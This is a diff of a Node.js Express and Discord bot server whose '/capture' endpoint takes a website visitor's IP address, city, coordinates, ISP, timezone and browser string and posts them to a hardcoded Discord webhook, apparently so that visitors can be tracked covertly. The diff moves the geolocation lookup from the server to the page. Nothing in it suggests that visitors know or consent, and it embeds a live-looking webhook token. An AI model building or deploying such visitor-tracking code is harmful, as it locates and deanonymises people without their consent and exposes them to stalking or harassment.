@@ -1,12 +1,10 @@
 const { Client, GatewayIntentBits } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
-const https = require('https');
 require('dotenv').config();
 
 const app = express();
 
-// ✅ PERMITIR CONEXIÓN DESDE NETLIFY
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -15,7 +13,6 @@ app.use((req, res, next) => {
   next();
 });
 
-app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
 const client = new Client({
@@ -69,98 +66,15 @@ client.on('messageCreate', async message => {
   }
 });
 
-app.get('/', (req, res) => {
-  res.send('✅ Bot funcionando correctamente');
-});
+app.get('/', (req, res) => res.send('✅ Bot funcionando'));
 
-// ✅ FUNCIÓN MEJORADA - USA MÁS APIs PARA OBTENER TODOS LOS DATOS
-async function getIPDetails(ip) {
-  try {
-    // Intento 1: ip-api.com (GRATIS y MÁS COMPLETA)
-    const result1 = await new Promise((resolve) => {
-      https.get(`http://ip-api.com/json/${ip}`, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-          try {
-            const json = JSON.parse(data);
-            if (json.status === 'success') {
-              resolve({
-                country: json.country || 'Desconocido',
-                countryCode: json.countryCode || 'N/A',
-                city: json.city || 'Desconocido',
-                region: json.regionName || 'Desconocido',
-                latitude: json.lat || 'N/A',
-                longitude: json.lon || 'N/A',
-                isp: json.isp || 'Desconocido',
-                timezone: json.timezone || 'Desconocido',
-                zip: json.zip || 'N/A'
-              });
-            } else {
-              resolve(null);
-            }
-          } catch {
-            resolve(null);
-          }
-        });
-      }).on('error', () => resolve(null));
-    });
-    
-    if (result1) return result1;
-
-    // Intento 2: fallback si la primera falla
-    const result2 = await new Promise((resolve) => {
-      https.get(`https://api.ipify.org?format=json`, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-          try {
-            const json = JSON.parse(data);
-            resolve({
-              country: 'Desconocido',
-              city: 'Desconocido',
-              region: 'Desconocido',
-              latitude: 'N/A',
-              longitude: 'N/A',
-              isp: 'Desconocido',
-              timezone: 'Desconocido'
-            });
-          } catch {
-            resolve(null);
-          }
-        });
-      }).on('error', () => resolve(null));
-    });
-
-    return result2 || {
-      country: 'Desconocido', city: 'Desconocido', region: 'Desconocido',
-      latitude: 'N/A', longitude: 'N/A', isp: 'Desconocido', timezone: 'Desconocido'
-    };
-  } catch {
-    return {
-      country: 'Desconocido', city: 'Desconocido', region: 'Desconocido',
-      latitude: 'N/A', longitude: 'N/A', isp: 'Desconocido', timezone: 'Desconocido'
-    };
-  }
-}
-
+// ✅ RECIBE TODO YA COMPLETO DESDE LA PÁGINA
 app.post('/capture', async (req, res) => {
-  const { userId, userAgent } = req.body;
+  const { ip, country, region, city, latitude, longitude, isp, timezone, userAgent } = req.body;
   
-  // ✅ OBTENER LA IP REAL DEL VISITANTE
-  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() 
-          || req.headers['cf-connecting-ip'] 
-          || req.headers['x-real-ip']
-          || req.socket.remoteAddress 
-          || req.ip
-          || 'IP no detectada';
+  res.send('✅ Recibido');
 
-  if (!userId) return res.status(400).send('Faltan datos');
-  
   try {
-    const details = await getIPDetails(ip);
-    
-    // ✅ TU WEBHOOK DE DISCORD
     const webhookUrl = 'https://discord.com/api/webhooks/1546973077731024966/W50wqczeBdGpvXIHrFXX2Tmd6wI8_ajSdO3CdTzIxxeo4MWi65JMgkMPfBSTVZ7KaFpA';
     
     await axios.post(webhookUrl, {
@@ -168,28 +82,25 @@ app.post('/capture', async (req, res) => {
         title: '📡 NUEVA VISITA DETECTADA',
         color: 0xff0000,
         fields: [
-          { name: '👤 Usuario', value: `\`${userId}\``, inline: false },
           { name: '🌐 IP', value: `\`${ip}\``, inline: false },
-          { name: '📍 País', value: `\`${details.country}\``, inline: true },
-          { name: '🏙️ Ciudad', value: `\`${details.city}\``, inline: true },
-          { name: '🗺️ Región', value: `\`${details.region}\``, inline: true },
-          { name: '🧭 Coordenadas', value: `\`Lat: ${details.latitude}\`\n\`Lon: ${details.longitude}\``, inline: false },
-          { name: '📶 Proveedor/ISP', value: `\`${details.isp}\``, inline: false },
-          { name: '🕐 Zona Horaria', value: `\`${details.timezone}\``, inline: true },
-          { name: '📱 Dispositivo/Navegador', value: `\`${userAgent.substring(0, 100)}...\``, inline: false }
+          { name: '📍 País', value: `\`${country}\``, inline: true },
+          { name: '🏙️ Ciudad', value: `\`${city}\``, inline: true },
+          { name: '🗺️ Región', value: `\`${region}\``, inline: true },
+          { name: '🧭 Coordenadas', value: `\`Lat: ${latitude}\`\n\`Lon: ${longitude}\``, inline: false },
+          { name: '📶 Proveedor', value: `\`${isp}\``, inline: false },
+          { name: '🕐 Zona Horaria', value: `\`${timezone}\``, inline: true },
+          { name: '📱 Dispositivo', value: `\`${userAgent.substring(0, 150)}\``, inline: false }
         ],
         timestamp: new Date().toISOString()
       }]
     });
-    
-    res.send('✅ Datos recibidos');
-  } catch (error) {
-    console.error('❌ Error:', error.response?.data || error.message);
-    res.status(500).send('Error');
+    console.log(`✅ Enviado: ${ip} - ${city}, ${country}`);
+  } catch (e) {
+    console.error('❌ Error:', e.message);
   }
 });
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Servidor corriendo en puerto ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Puerto ${PORT}`));
 
 client.login(process.env.DISCORD_TOKEN);
